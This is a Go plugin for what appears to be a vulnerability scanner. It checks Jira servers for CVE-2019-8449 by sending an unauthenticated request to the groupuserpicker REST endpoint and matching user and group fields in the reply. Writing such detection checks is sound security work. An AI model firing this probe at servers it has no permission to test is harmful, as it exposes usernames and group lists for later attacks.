// goplugin/plugin2.go
package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("jira_cve_2019_8449", &jira_cve_2019_8449{})
}

type jira_cve_2019_8449 struct{}

func (p *jira_cve_2019_8449) Info() PluginInfo {
	return PluginInfo{
		Name:     "Jira信息泄露漏洞",
		VulnInfo: "Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 Atlassian Jira 8.4.0之前版本中的/rest/api/latest/groupuserpicker资源存在信息泄露漏洞。",
		VulnID:   "CVE-2019-8449",
		Level:    "5.3 MEDIUM",
		URL:      "",
		Version:  "Jira <= 8.4.0",
		CWE:      "CWE-200	信息暴露",
	}
}

func (p *jira_cve_2019_8449) Check(netloc string) bool {
	checkURL := netloc + "/rest/api/latest/groupuserpicker?query=admin&maxResults=50&showAvatar=false"
	checkReq, err := http.NewRequest("GET", checkURL, nil)
	if err != nil {
		return false
	}
	checkResp, err := utils.RequestDo(checkReq, true, 2)
	if err != nil {
		return false
	}

	if checkResp.Other.StatusCode == 200 && strings.Contains(checkResp.ResponseRaw, "total") &&
		strings.Contains(checkResp.ResponseRaw, "groups") && strings.Contains(checkResp.ResponseRaw, "header") &&
		strings.Contains(checkResp.ResponseRaw, "users") {
		return true
	}

	return false
}
